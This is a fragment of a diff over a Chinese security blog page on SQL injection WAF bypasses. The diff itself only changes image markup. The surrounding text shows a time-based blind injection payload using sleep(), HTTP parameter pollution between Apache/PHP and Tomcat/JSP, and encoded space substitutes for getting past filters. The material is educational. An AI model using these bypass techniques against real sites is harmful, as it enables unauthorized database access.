class="operator">+</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)) # <span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure></div>
 
 <p>可以利用联合注入代替order by</p>
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg"
                       alt="image-20220707223820177"
-                ></p>
+                ><figcaption>image-20220707223820177</figcaption></figure></p>
 <h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p>
 <blockquote>
 <p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p>
 <p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p>
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg"
                       alt="image-20220708192908674"
-                ></p>
+                ><figcaption>image-20220708192908674</figcaption></figure></p>
 </blockquote>
 <h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/替代空格</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a 新建一行</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0c 新的一页</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d <span class="built_in">return</span> 功能</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">a0 空格</span></span><br><span class="line">() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</span><br></pre></td></tr></table></figure></div>
 
